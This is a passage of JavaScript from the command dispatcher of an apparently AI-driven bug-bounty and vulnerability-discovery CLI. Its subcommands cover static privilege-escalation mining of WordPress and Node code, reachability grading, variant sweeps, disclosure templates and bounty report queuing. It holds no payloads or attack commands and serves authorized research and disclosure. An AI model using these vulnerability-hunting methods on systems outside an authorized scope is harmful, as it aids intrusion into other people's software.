      const { makeKimiAgent } = await import('../engine/kimi-runagent.mjs');
      const { DEMO_SESSION } = await import('../engine/live.mjs');
      // Brain passthrough (the local-brain seam, engine/brain-provider.mjs): --brain
      // openai-compatible resumes the mission onto the openai-compatible provider.
      // Endpoint details ride the SAME precedence as everywhere else: the explicit
      // --brain-url/--brain-model/--brain-key-env flags, then VARVEL_BRAIN_* env, then
      // the engagement's brain.* settings. Absent --brain: provider null — the default
      // Kimi path is byte-identical to before.
      const BRAIN_FLAGS = ['--brain', '--brain-url', '--brain-model', '--brain-key-env'];
      const flagV = (name) => { const i = args.indexOf(name); return i !== -1 ? args[i + 1] : undefined; };
      let provider = null;
      if (flagV('--brain')) {
        provider = { provider: flagV('--brain') };
        if (flagV('--brain-url')) provider.baseUrl = flagV('--brain-url');
        if (flagV('--brain-model')) provider.model = flagV('--brain-model');
        if (flagV('--brain-key-env')) provider.apiKeyEnv = flagV('--brain-key-env');
      }
      const instruction = args.slice(1).filter((a, i, arr) => !a.startsWith('--') && !BRAIN_FLAGS.includes(arr[i - 1])).join(' ').trim() || 'Continue the mission from the checkpoint.';
      let agent;
      try {
        agent = makeKimiAgent({ sessionFile: cp.sessionFile || process.env.ENCLAVE_SESSION || DEMO_SESSION, wsDir: cp.wsDir, model: cp.model || undefined, effort: cp.effort || 'high', container: cp.container || '', engagement: cp.engagement || undefined, provider });
      } catch (e) { return { error: 'resume needs a Kimi credential (kimi-code OAuth / ~/.kimicode/config.json) or a usable --brain config: ' + String((e && e.message) || e) }; }
      const r = await agent({ system: 'You are resuming a checkpointed governed mission. The conversation so far is reconstructed from the checkpoint — continue it; do not restart.', messages: [{ role: 'user', content: instruction }], resumeId: cp.missionId, resume: true });
      return { missionId: r.missionId, resumedFrom: { turns: cp.turnsTotal || 0, toolCalls: (cp.ledger || []).length, retries: (cp.retries || []).length }, reconstructed: r.reconstructed === true, steps: r.steps, retries: r.retries, provider: r.provider, text: r.text };
    }
    case 'split': {
      // Session-splitting: summarize mission-so-far into a structured handoff (objective,
      // state REFS, decisions, pending gates, failed hypotheses — refuted paths SURVIVE the
      // split so the next session never retries them) and seed a fresh mission with it.
      if (!args[0] || args[0].startsWith('--')) throw new Error('split needs <missionId> [note] — see: missions');
      const { splitMission, shouldSplit, loadCheckpoint: loadCp } = await import('../engine/missions.mjs');
      const note = args.slice(1).filter((a) => !a.startsWith('--')).join(' ').trim() || undefined;
      let out;
      try { out = splitMission(args[0], { note }); } catch (e) { return { error: String((e && e.message) || e) }; }
      if (out.already) return { already: true, successor: (out.handoff && out.handoff.newMission) || null };
      const verdict = shouldSplit({ turns: (loadCp(args[0]) || {}).turnsTotal || 0, bytes: (loadCp(args[0]) || {}).bytes || 0 });
      return { split: true, from: args[0], newMission: out.mission && out.mission.missionId, handoff: out.handoff, threshold: verdict, next: 'resume ' + (out.mission && out.mission.missionId) };
    }
    case 'privemap': {
      // Privesc/impact-primitive source miner for local WordPress-flavored PHP trees —
      // the Madara hand-review method, productized. Pure static ranking of a LOCAL tree:
      // no requests are fired; the report's probes are read-only/version-discriminator
      // suggestions and destructive classes are doctrineGated. Default prints the ranked
      // table (rank/sev/reachability/impactClass/ref/title); --json returns the report.
      if (!args[0] || args[0].startsWith('--')) throw new Error('privemap needs <source-dir> [--top N] [--json] — rank privesc/impact primitives in a local plugin/theme PHP tree');
      const { privemap } = await import('../tools/privemap.mjs');
      const topI = args.indexOf('--top');
      const top = topI !== -1 && Number(args[topI + 1]) > 0 ? Math.floor(Number(args[topI + 1])) : 20;
      const report = privemap(args[0]);
      if (args.includes('--json')) return report;
      const rows = report.candidates.slice(0, top);
      const cols = [
        ['rank', 4, (c) => c.rank],
        ['sev', 5, (c) => c.sev],
        ['reachability', 12, (c) => c.reachability],
        ['impactClass', 17, (c) => c.impactClass + (c.doctrineGated ? '†' : '')],
        ['ref', 56, (c) => c.ref],
        ['title', 70, (c) => c.title],
      ];
      const fmt = (vals) => cols.map(([, w], i) => String(vals[i]).slice(0, w).padEnd(w)).join(' ');
      console.log(`privemap: ${report.root} — ${report.scannedFiles} php files, ${report.candidates.length} candidates, ${report.skipped.length} skipped, ${report.gaps.length} gaps; top ${rows.length} († = doctrineGated, read-only probes only)`);
      if (report.skipped.length) console.log(`  skipped: ${report.skipped.slice(0, 5).map((s) => `${s.path} (${s.reason})`).join('; ')}${report.skipped.length > 5 ? ' …' : ''}`);
      console.log(fmt(cols.map((c) => c[0])));
      for (const c of rows) console.log(fmt(cols.map(([, , f]) => f(c))));
      return { root: report.root, scannedFiles: report.scannedFiles, candidates: report.candidates.length, skipped: report.skipped.length, gaps: report.gaps.length, printed: rows.length, note: 'table above; re-run with --json for the full ranked report incl. probes/mitigations' };
    }
    case 'reachprove': {
      // Mechanical reachability adjudication (engine/reachability.mjs) — the fix for
      // privemap's heuristic `reachability` field burning AI adjudication on dead
      // candidates. Pure static, zero network. UNKNOWN is a first-class verdict:
      // unresolvable callbacks/gates report UNKNOWN with the named reason, never a
      // fabricated floor. KILLED is reserved for never-remote surface (cron-scheduled
      // hooks, admin-render hooks) proven at HIGH confidence.
      //   reachprove <dir>                          verdict per registration found
      //   reachprove <dir> --entry <file:line|hook> verdict for one entry point
      //   reachprove <dir> --rescore <report.json|->  re-grade a privemap report
      if (!args[0] || args[0].startsWith('--')) throw new Error('reachprove needs <source-dir> [--entry <file:line|hook>] [--rescore <privemap.json|->] [--top N] [--json]');
      const { reachprove, reachproveEntry, reachproveRescore } = await import('../tools/reachprove.mjs');
      const topI = args.indexOf('--top');
      const top = topI !== -1 && Number(args[topI + 1]) > 0 ? Math.floor(Number(args[topI + 1])) : 20;
      const entryI = args.indexOf('--entry');
      const entry = entryI !== -1 && args[entryI + 1] && !args[entryI + 1].startsWith('--') ? args[entryI + 1] : undefined;
      const rescoreI = args.indexOf('--rescore');
      const rescoreSrc = rescoreI !== -1 && args[rescoreI + 1] && !args[rescoreI + 1].startsWith('--') ? args[rescoreI + 1] : undefined;
      if (rescoreSrc !== undefined) {
        // --rescore - reads the privemap report from STDIN (pipe:
        // `privemap <dir> --json | reachprove <dir> --rescore -`); a path reads the file.
        let reportJson;
        try {
          const raw = rescoreSrc === '-' ? readFileSync(0, 'utf8') : readFileSync(rescoreSrc, 'utf8');
          reportJson = JSON.parse(raw);
        } catch (e) {
          return { error: `reachprove --rescore: could not read/parse the privemap report (${rescoreSrc === '-' ? 'stdin' : rescoreSrc}): ${(e && e.message) || e}` };
        }
        const report = reachproveRescore(args[0], reportJson);
        if (args.includes('--json')) return report;
        const rows = report.results.slice(0, top);
        const cols = [
          ['newRank', 7, (r) => r.newRank],
          ['verdict', 9, (r) => r.verdict],
          ['privemap', 12, (r) => r.privemapReach],
          ['proven', 11, (r) => r.provenReach],
          ['score', 9, (r) => `${r.privemapScore}→${r.newScore}`],
          ['ref', 40, (r) => r.ref],
          ['reason', 60, (r) => r.reason],
        ];
        const fmt = (vals) => cols.map(([, w], i) => String(vals[i] ?? '').slice(0, w).padEnd(w)).join(' ');
        const s = report.summary;
        console.log(`reachprove rescore: ${report.root} — ${report.results.length} candidates; CONFIRMED ${s.CONFIRMED} / DEGRADED ${s.DEGRADED} / KILLED ${s.KILLED} / UNCERTAIN ${s.UNCERTAIN}; re-ranked top ${rows.length} (scores penalized; UNKNOWN never fabricated)`);
        console.log(fmt(cols.map((c) => c[0])));
        for (const r of rows) console.log(fmt(cols.map(([, , f]) => f(r))));
        return { root: report.root, candidates: report.results.length, summary: s, printed: rows.length, note: 'table above; re-run with --json for full evidenceChain per candidate' };
      }
      const report = entry !== undefined ? reachproveEntry(args[0], entry) : reachprove(args[0]);
      if (args.includes('--json')) return report;
      const rows = report.entries.slice(0, top);
      const cols = [
        ['verdict', 10, (e) => e.verdict],
        ['conf', 6, (e) => e.confidence],
        ['hook', 30, (e) => e.entry.hook],
        ['handler', 30, (e) => e.entry.handler],
        ['registration', 40, (e) => e.entry.registration],
        ['reason', 60, (e) => e.reason],
      ];
      const fmt = (vals) => cols.map(([, w], i) => String(vals[i] ?? '').slice(0, w).padEnd(w)).join(' ');
      console.log(`reachprove: ${report.root} — ${report.scannedFiles} php files, ${report.stats.registrations} registrations (${report.stats.cronHooks} cron hooks), ${report.skipped.length} skipped, ${report.gaps.length} gaps${entry ? `; entry '${entry}'` : ''}; top ${rows.length}`);
      if (report.notFound) console.log(`  ${report.notFound}`);
      if (report.skipped.length) console.log(`  skipped: ${report.skipped.slice(0, 5).map((s2) => `${s2.path} (${s2.reason})`).join('; ')}${report.skipped.length > 5 ? ' …' : ''}`);
      console.log(fmt(cols.map((c) => c[0])));
      for (const e of rows) console.log(fmt(cols.map(([, , f]) => f(e))));
      return { root: report.root, scannedFiles: report.scannedFiles, registrations: report.stats.registrations, entries: report.entries.length, printed: rows.length, ...(report.notFound ? { notFound: report.notFound } : {}), note: 'table above; re-run with --json for full verdicts incl. evidenceChain/notes' };
    }
    case 'variantsweep': {
      // Same-shape variant sweep over a LOCAL corpus (research §6 item 1): --sig is a
      // JSON file path or an inline JSON signature — { kind:'pattern', match, anchors } or
      // { kind:'class', class:'<privemap sink class>' }. Pure static, zero network; hits
      // carry a blank status field — the sweep never claims novelty/CVE status.
      if (!args[0] || args[0].startsWith('--')) throw new Error("variantsweep needs <source-dir> --sig <sig.json|'<inline-json>'> [--top N] [--json] — sweep a local WP-plugin corpus for carriers of a vuln signature");
      const { variantsweep } = await import('../tools/variantsweep.mjs');
      const sigI = args.indexOf('--sig');
      const sigSrc = sigI !== -1 ? args[sigI + 1] : undefined;
      if (!sigSrc || sigSrc.startsWith('--')) throw new Error('variantsweep needs --sig <sig.json|inline-json> — e.g. {"kind":"class","class":"option-overwrite"}');
      let sig = sigSrc;
      if (!sigSrc.trim().startsWith('{')) {
        if (!existsSync(sigSrc)) return { error: `signature file not found: ${sigSrc}` };
        sig = readFileSync(sigSrc, 'utf8');
      }
      const topI = args.indexOf('--top');
      const top = topI !== -1 && Number(args[topI + 1]) > 0 ? Math.floor(Number(args[topI + 1])) : 20;
      const report = variantsweep(args[0], sig);
      if (args.includes('--json')) return report;
      if (!report.signature) return { error: `bad signature: ${report.errors.join('; ')}` };
      const rows = report.hits.slice(0, top);
      const cols = [
        ['rank', 4, (h) => h.rank],
        ['conf', 8, (h) => h.confidence],
        ['class', 17, (h) => h.class],
        ['reachability', 12, (h) => h.reachability],
        ['plugin', 22, (h) => h.plugin],
        ['ref', 62, (h) => h.ref],
      ];
      const fmt = (vals) => cols.map(([, w], i) => String(vals[i]).slice(0, w).padEnd(w)).join(' ');
      console.log(`variantsweep: ${report.root} — signature '${report.signature.id}' (${report.signature.kind}); ${report.scannedFiles} php files scanned, ${report.stats.prefilteredFiles} prefiltered, ${report.hits.length} hits; top ${rows.length} (status field intentionally blank — operator adjudicates novelty)`);
      if (report.errors.length) console.log(`  errors: ${report.errors.join('; ')}`);
      if (report.skipped.length) console.log(`  skipped: ${report.skipped.slice(0, 5).map((s) => `${s.path} (${s.reason})`).join('; ')}${report.skipped.length > 5 ? ' …' : ''}`);
      console.log(fmt(cols.map((c) => c[0])));
      for (const h of rows) console.log(fmt(cols.map(([, , f]) => f(h))));
      return { root: report.root, signature: report.signature.id, scannedFiles: report.scannedFiles, prefilteredFiles: report.stats.prefilteredFiles, hits: report.hits.length, printed: rows.length, note: 'table above; re-run with --json for full hit records incl. evidence/hook/handler' };
    }
    case 'goldenbench': {
      // THE privemap regression GATE (research §6 item 9): runs privemap over every
      // entry in the golden manifest (default data/goldenbench/manifest.json) and
      // grades recall (every must-hit pin lands at/above its expected reachability)
      // and precision (verified-clean plugins yield zero CONFIRMED-band unauth
      // candidates; sub-band counts recorded, never hidden). Corpus-absent entries
      // SKIP with a named reason — a cleaned .tmp never fails the bench. Verdict FAIL
      // exits 2 (the error field is set) so the gate is CI-wireable.
      const mI = args.indexOf('--manifest');
      const manifestPath = mI !== -1 && args[mI + 1] && !args[mI + 1].startsWith('--') ? args[mI + 1] : undefined;
      const { goldenbench, DEFAULT_MANIFEST } = await import('../tools/goldenbench.mjs');
      const report = goldenbench(manifestPath ? { manifestPath } : {});
      if (args.includes('--json')) {
        return report.verdict === 'FAIL'
          ? { error: `goldenbench FAIL — ${report.totals.entries.failed + report.totals.entries.errored} entr${report.totals.entries.failed + report.totals.entries.errored === 1 ? 'y' : 'ies'} failed`, ...report }
          : report;
      }
      const t = report.totals;
      console.log(`goldenbench: ${report.manifest === DEFAULT_MANIFEST ? 'data/goldenbench/manifest.json' : report.manifest} — verdict ${report.verdict}; recall ${t.recall.found}/${t.recall.expected}${t.recall.pct === null ? '' : ` (${t.recall.pct}%)`}, precision violations ${t.precision.violations} over ${t.precision.cleanPlugins} clean plugins; entries ${t.entries.passed} pass / ${t.entries.failed} fail / ${t.entries.skipped} skip / ${t.entries.errored} error`);
      for (const e of report.entries) {
        if (e.status === 'skip') { console.log(`  SKIP ${e.id} — ${e.reason}`); continue; }
        const detail = e.expectation === 'must-hit'
          ? `recall ${e.recall.found}/${e.recall.expected}`
          : `band violations ${e.precision.violations.length}, unauth conf high/med/low ${e.precision.unauthByConfidence.high}/${e.precision.unauthByConfidence.medium}/${e.precision.unauthByConfidence.low}, sev crit/high/med/low/info ${e.precision.bySeverity.crit}/${e.precision.bySeverity.high}/${e.precision.bySeverity.med}/${e.precision.bySeverity.low}/${e.precision.bySeverity.info}`;
        console.log(`  ${e.status.toUpperCase().padEnd(5)} ${e.id} — ${detail} (${e.measured.scannedFiles} files, ${e.measured.candidates} candidates, ${e.measured.unresolvedCallbacks} unresolved-callback gaps)`);
        for (const f of e.failures || []) console.log(`        ${f}`);
      }
      if (Object.keys(t.byClass).length) console.log(`  per-class recall: ${Object.entries(t.byClass).map(([cls, b]) => `${cls} ${b.found}/${b.expected}`).join(', ')}`);
      if (report.errors.length) console.log(`  errors: ${report.errors.join('; ')}`);
      const out = { verdict: report.verdict, manifest: report.manifest, totals: report.totals, note: 'table above; re-run with --json for full per-entry detail incl. hits/near-misses/violations' };
      if (report.verdict === 'FAIL') out.error = `goldenbench FAIL — ${t.entries.failed + t.entries.errored} entr${t.entries.failed + t.entries.errored === 1 ? 'y' : 'ies'} failed (missed pins / band violations named above)`;
      return out;
    }
    case 'jsmap': {
      // The privemap method ported to Node/JS application source: route registrations
      // (express/koa + raw createServer) × impact sinks (child_process interpolation,
      // eval/new Function, prototype-polluting merges, path traversal, SSRF, jwt
      // alg-pin gaps, === secret compares, unsafe deserialization) + the differential
      // auth-middleware gap class. Pure static ranking of a LOCAL tree: no requests are
      // fired; probes are read-only/differential suggestions.
      if (!args[0] || args[0].startsWith('--')) throw new Error('jsmap needs <source-dir> [--top N] [--json] — rank impact primitives in a local Node/JS source tree');
      const { jsmap } = await import('../tools/jsmap.mjs');
      const topI = args.indexOf('--top');
      const top = topI !== -1 && Number(args[topI + 1]) > 0 ? Math.floor(Number(args[topI + 1])) : 20;
      const report = jsmap(args[0]);
      if (args.includes('--json')) return report;
      const rows = report.candidates.slice(0, top);
      const cols = [
        ['rank', 4, (c) => c.rank],
        ['sev', 5, (c) => c.sev],
        ['reachability', 12, (c) => c.reachability],
        ['impactClass', 17, (c) => c.impactClass],
        ['ref', 56, (c) => c.ref],
        ['title', 70, (c) => c.title],
      ];
      const fmt = (vals) => cols.map(([, w], i) => String(vals[i]).slice(0, w).padEnd(w)).join(' ');
      console.log(`jsmap: ${report.root} — ${report.scannedFiles} source files, ${report.stats.routes} routes, ${report.candidates.length} candidates, ${report.skipped.length} skipped, ${report.gaps.length} gaps; top ${rows.length} (read-only probes only)`);
      if (report.skipped.length) console.log(`  skipped: ${report.skipped.slice(0, 5).map((s) => `${s.path} (${s.reason})`).join('; ')}${report.skipped.length > 5 ? ' …' : ''}`);
      console.log(fmt(cols.map((c) => c[0])));
      for (const c of rows) console.log(fmt(cols.map(([, , f]) => f(c))));
      return { root: report.root, scannedFiles: report.scannedFiles, routes: report.stats.routes, candidates: report.candidates.length, skipped: report.skipped.length, gaps: report.gaps.length, printed: rows.length, note: 'table above; re-run with --json for the full ranked report incl. probes/mitigations' };
    }
    case 'pocdoc': {
      // Disclosure-paperwork rung: fill the Wordfence CNA submission template from a
      // validated miner candidate. The JSON arg is either a single candidate object or
      // a full privemap/jsmap report (then --rank N picks the candidate, default 1).
      // Fields the candidate cannot know print TODO(validate) — never fabricated.
      if (!args[0] || args[0].startsWith('--')) throw new Error('pocdoc needs <finding.json> [--rank N] [--software <name>] [--slug <s>] [--versions <range>] [--researcher <h>] [--out <md>]');
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      let parsed;
      try { parsed = JSON.parse(readFileSync(args[0], 'utf8')); } catch (e) { return { error: `cannot read/parse finding JSON: ${(e && e.message) || e}` }; }
      let candidate = parsed;
      if (parsed && Array.isArray(parsed.candidates)) {
        const rank = Number(opt('--rank') || 1);
        candidate = parsed.candidates.find((c) => c.rank === rank) || parsed.candidates[0];
      }
      if (!candidate || typeof candidate !== 'object') return { error: 'no candidate in the JSON (expected a candidate object or a { candidates: [...] } report)' };
      const { pocDoc } = await import('../engine/pocdoc.mjs');
      const md = pocDoc(candidate, { software: opt('--software'), slug: opt('--slug'), affectedVersions: opt('--versions'), researcher: opt('--researcher'), vendor: opt('--vendor') });
      const out = opt('--out');
      if (out) {
        const { writeFileSync, mkdirSync } = await import('node:fs');
        const { dirname } = await import('node:path');
        try { mkdirSync(dirname(out), { recursive: true }); } catch {}
        writeFileSync(out, md);
      }
      console.log(md);
      return { wrote: out || null, title: candidate.title || null, impactClass: candidate.impactClass || null, todoHonesty: 'fields the candidate cannot know are marked TODO(validate) in the document' };
    }
    case 'program': {
      // BUG-BOUNTY SCOPE INTAKE (tools/program.mjs): normalize a program's PUBLISHED
      // scope into VARVEL's signed-scope fixture format. Offline by doctrine — domains
      // are carried with the resolution gap named, never resolved here; out-of-scope
      // always wins on overlap; empty in-scope is refused with a named reason. --sign
      // reuses the seam's own signSession (the scope-sign.mjs path) and self-verifies
      // before anything is written. NO write happens unless the operator names --out:
      // with --sign the file is the session fixture; without --sign it is the
      // normalized intake record (an unsigned session-shaped file would LOOK ready).
      if (args[0] !== 'import' || !args[1] || args[1].startsWith('--')) throw new Error("program needs import <fixture.json> --platform hackerone|bugcrowd|generic [--principal <p>] [--workspace <w>] [--out scope.json] [--sign]");
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const { importProgram, signScope } = await import('./program.mjs');
      const n = importProgram(args[1], { platform: opt('--platform') || 'generic' });
      if (!n.ok) return n;
      const out = { ...n };
      const file = opt('--out');
      if (args.includes('--sign')) {
        const s = await signScope(n, { principal: opt('--principal') || 'marcus', workspace: opt('--workspace'), sessionId: opt('--session-id') });
        out.signing = s.ok ? { ok: true, principal: s.fixture.principal, workspace: s.fixture.workspace, session_id: s.fixture.session_id, carriedIdentity: s.carriedIdentity } : s;
        if (s.ok) {
          if (file) {
            try { mkdirSync(dirname(file), { recursive: true }); } catch {}
            writeFileSync(file, JSON.stringify(s.fixture, null, 2) + '\n');
            out.wrote = file;
          } else out.signedFixture = s.fixture; // printed, never written without --out
        }
      } else if (file) {
        try { mkdirSync(dirname(file), { recursive: true }); } catch {}
        writeFileSync(file, JSON.stringify(n, null, 2) + '\n');
        out.wrote = file;
      }
      return out;
    }
    case 'bountyreport': {
      // THE PAYABLE-REPORT RUNG (tools/bountyreport.mjs): a VARVEL findings JSON ->
      // submission-ready bounty markdown. One finding per report (--ref/--index
      // selects, default the highest-severity); secrets/cookies/tokens are redacted
      // from evidence per the OPSEC doctrine; the honesty footer lists every
      // unverified gap and submission readiness is COMPUTED from the validator gate.
      if (!args[0] || args[0].startsWith('--')) throw new Error('bountyreport needs <findings.json> [--platform hackerone|bugcrowd|generic] [--ref <ref>] [--index N] [--researcher <h>] [--out report.md]');
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      let doc;
      try { doc = JSON.parse(readFileSync(args[0], 'utf8')); } catch (e) { return { error: `cannot read/parse findings JSON: ${(e && e.message) || e}` }; }
      const { bountyReport } = await import('./bountyreport.mjs');
      const r = bountyReport(doc, { platform: opt('--platform') || 'hackerone', ref: opt('--ref'), index: opt('--index'), researcher: opt('--researcher') });
      if (!r.ok) return r;
      const out = opt('--out');
      if (out) {
        try { mkdirSync(dirname(out), { recursive: true }); } catch {}
        writeFileSync(out, r.md);
      }
      console.log(r.md);
      return { wrote: out || null, platform: r.platform, finding: r.finding, readiness: r.readiness, submittable: r.submittable, redactions: r.redactions, gaps: r.gaps.length, others: r.others };
    }
    case 'bountyline': {
      // THE AUTONOMOUS BOUNTY PIPELINE (engine/bountyline.mjs): roster -> scope gate ->
      // automation gate -> hunt record -> validator-readiness triage -> bountyreport drafts
      // -> QUEUED-FOR-SEND -> operator-marked outcomes in the ledger. THE PIPELINE NEVER
      // SUBMITS — 'queue' is a report file + a submission checklist for the operator's
      // send click; no network submission code path exists in the engine, by design.
      const sub = args[0];
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const bl = await import('../engine/bountyline.mjs');
      if (sub === 'add') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline add needs <intakeRecord.json> [--scope signed.json] [--automation full|human-cadence|prohibited] — the intake record is a program.mjs import --out file');
        return await bl.addProgram({ intakePath: args[1], scopePath: opt('--scope'), automation: opt('--automation') });
      }
      if (sub === 'list') {
        const roster = bl.loadRoster();
        for (const p of roster.programs) console.log(`${p.id}  [${p.platform}]  ${p.state}  automation:${p.automation}  reports:${p.reports}  (${p.updatedAt})`);
        if (!roster.programs.length) console.log('(roster empty — bountyline add <intakeRecord.json>)');
        return { programs: roster.programs };
      }
      if (sub === 'show') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline show needs <id>');
        const rec = bl.loadProgram(args[1]);
        if (!rec) return { ok: false, error: 'unknown-program', reason: `no program '${args[1]}' on the roster` };
        return { program: rec, ledger: bl.loadLedger().filter((e) => e.program === rec.id) };
      }
      if (sub === 'run') {
        // The automation gate as code. Refusals are loud data ({ ok:false, error, reason });
        // a pass without artifacts prints the gated RUN PLAN and changes nothing.
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline run needs <id> [--scope signed.json] [--campaign surface.json] [--report report.md] [--operator-ack "note"]');
        const r = await bl.runProgram(args[1], { scopePath: opt('--scope'), campaignArtifact: opt('--campaign'), reportArtifact: opt('--report'), operatorAck: opt('--operator-ack') });
        if (r.ok && r.runPlan) console.log(`${r.hunted ? 'HUNT RECORDED' : 'GATE PASSED — run plan (nothing launched by this command)'} [policy ${r.runPlan.policy}] campaign knobs: ${JSON.stringify(r.runPlan.campaign)}`);
        return r;
      }
      if (sub === 'triage') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline triage needs <id> [--stale-days N] — split the hunt findings by validator readiness (counts only)');
        const r = bl.triageProgram(args[1], { staleDays: opt('--stale-days') !== undefined ? Number(opt('--stale-days')) : undefined });
        if (r.ok) console.log(`triaged: ${r.ready} ready / ${r.notReady} not-ready of ${r.total} finding(s)`);
        return r;
      }
      if (sub === 'draft') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline draft needs <id> [--researcher <h>] — one bountyreport markdown per READY finding');
        const r = bl.draftReports(args[1], { researcher: opt('--researcher') });
        if (r.ok) for (const rep of r.reports) console.log(`drafted ${rep.path} [${rep.readiness}, ${rep.redactions} redaction(s)]`);
        return r;
      }
      if (sub === 'report') {
        // THE MANUAL SOURCE-REVIEW LANE: record a hand-built, code-evidenced report doc
        // (the Wordfence flow — no hunt campaign exists). imported|scoped -> reported.
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline report needs <id> --file <report.md> [--finding <label>] — the source-review lane: the doc must exist on disk');
        const r = bl.recordManualReport(args[1], { reportPath: opt('--file'), finding: opt('--finding') });
        if (r.ok) console.log(`manual report recorded: ${r.reports[0].path} (state '${r.state}' — queue it when the operator is ready to send)`);
        return r;
      }
      if (sub === 'queue') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('bountyline queue needs <id> — QUEUED-FOR-SEND: report path + submission checklist; the pipeline NEVER submits');
        const r = bl.queueProgram(args[1]);
        if (r.ok) for (const item of r.queue.items) { console.log(`QUEUED-FOR-SEND: ${item.report}`); for (const c of item.checklist) console.log('  [ ] ' + c); }
        return r;
      }
      if (sub === 'mark') {
        if (!args[1] || !args[2] || args[2].startsWith('--')) throw new Error('bountyline mark needs <id> submitted|duplicate|informative|resolved|paid [--amount N --currency GBP] [--report <path>] [--note <text>]');
        return bl.markOutcome(args[1], args[2], { amount: opt('--amount'), currency: opt('--currency'), report: opt('--report'), note: opt('--note') });
      }
      if (sub === 'ledger') {
        const lines = bl.ledgerLines();
        for (const l of lines) console.log(l);
        return { lines, ...bl.ledgerTotals() };
      }
      throw new Error('bountyline needs add | list | show <id> | run <id> | triage <id> | draft <id> | report <id> --file <doc> | queue <id> | mark <id> <outcome> | ledger');
    }
    case 'brainharness': {
      // THE BRAIN GRADER (tools/brainharness.mjs): run the fidelity/honesty/loop/needle/
      // speed gates against an OpenAI-compatible brain under the REAL VARVEL system prompt
      // (its sha256 rides the scorecard). The kimi default provider is refused loudly by
      // planBrain — this gates the Spark-class local brains, not the cloud default.
      const optB = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const bh = await import('./brainharness.mjs');
      const plan = bh.planBrain({ env: process.env, providerEnv: args.includes('--provider-env') });
      if (!plan.ok) throw new Error('brainharness: ' + plan.error);
      const suiteArg = optB('--suite') || 'all';
      const suites = suiteArg === 'all' ? bh.SUITES : suiteArg.split(',').map((s) => s.trim()).filter(Boolean);
      // Same refusal as brainharness.mjs main(): an unknown suite name must NOT degrade
      // to a vacuous PASS over zero gates (a grader that passes nothing grades nothing).
      const badSuites = suites.filter((s) => !bh.SUITES.includes(s));
      if (!suites.length || badSuites.length) throw new Error('brainharness: bad --suite ' + JSON.stringify(suiteArg) + ' — valid: ' + bh.SUITES.join(', '));
      const card = await bh.runAll({ brain: plan.brain, key: plan.key, suites, log: (s) => console.error(s) });
      const out = optB('--out');
      if (out) { mkdirSync(dirname(out), { recursive: true }); writeFileSync(out, JSON.stringify(card, null, 2) + '\n'); console.error('[out] scorecard written to ' + out); }
      console.error('[result] ' + (card.pass ? 'PASS' : 'FAIL'));
      return card;
    }
    case 'h1watch': {
      // THE BOUNTY PIPELINE'S EYES (tools/h1watch.mjs): watch HackerOne's public
      // directory + structured scopes, diff against the recorded state, rank the fresh
      // ground, and emit operator-REVIEWABLE intake files. NEVER signs, NEVER runs —
      // the doctrine line rides every output. Fully offline against --fixture; the live
      // path is the SAME code with the real client (credential from env VARVEL_H1_TOKEN
      // — the NAME only; absent is a loud refusal, never fabricated data).
      const sub = args[0];
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const h1 = await import('./h1watch.mjs');
      const fmt = (e) => `[rank ${e.rank}] ${e.at} ${e.type}${e.side === 'out' ? ' (EXCLUSIONS — honor before any contact)' : ''} ${e.handle}${e.assets && e.assets.length ? ' — ' + e.assets.slice(0, 5).join(', ') + (e.assets.length > 5 ? ` (+${e.assets.length - 5} more)` : '') : ''}`;
      if (sub === 'scan') {
        const fixture = opt('--fixture');
        const source = fixture ? h1.fixtureSource(fixture) : h1.liveSource({ base: opt('--base') });
        if (!source.ok) return { ...source, doctrine: h1.DOCTRINE };
        const r = await h1.scan({ source, emit: args.includes('--emit-intake'), outboxDir: opt('--outbox') });
        if (r.ok) {
          console.log(`scanned ${r.scanned} program(s) — ${r.events.length} event(s), ${r.errors.length} fetch error(s)`);
          for (const e of r.ranked) console.log('  ' + fmt(e));
          for (const err of r.errors) console.log(`  ERROR ${err.handle}: ${err.error} — ${err.reason}`);
          if (r.outbox) for (const w of r.outbox.written) console.log(`  outbox: ${w.file}`);
          console.log(h1.DOCTRINE);
        }
        return r;
      }
      if (sub === 'report') {
        const r = h1.report({ all: args.includes('--all') });
        if (!r.events.length) console.log(r.note || '(no events in the most recent scan — h1watch report --all for the recorded ring)');
        for (const e of r.events) console.log(fmt(e));
        console.log(h1.DOCTRINE);
        return r;
      }
      if (sub === 'show') {
        if (!args[1] || args[1].startsWith('--')) throw new Error('h1watch show needs <handle>');
        const r = h1.show(args[1]);
        if (r.ok) console.log(h1.DOCTRINE);
        return r;
      }
      throw new Error('h1watch needs scan [--fixture f] [--emit-intake] [--outbox d] [--base u] | report [--all] | show <handle>');
    }
    case 'commitwatch': {
      // THE VULN-DISCOVERY LAYER'S EYES (tools/commitwatch.mjs + engine/commitwatch.mjs):
      // watch tracked WP plugins' SVN trunk for fresh changesets, classify the diffs for
      // security relevance (a check ADDED = the vuln class + affected versions + a
      // sibling-hunt seed), and record ranked REVIEW-ONLY leads. NEVER hunts, NEVER
      // submits — the doctrine line rides every output. Fully offline against
      // --fixture; the live path is GATED behind --live (wordpress.org hosts only,
      // read-only GETs) and refuses without it, loudly.
      const sub = args[0];
      const opt = (flag) => { const i = args.indexOf(flag); return i !== -1 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : undefined; };
      const cw = await import('./commitwatch.mjs');
      const fmt = (l) => `[${l.band} ${l.score}] r${l.revision} ${l.slug} — ${l.classesHit.join(', ')} (${l.files.length} file(s))`;
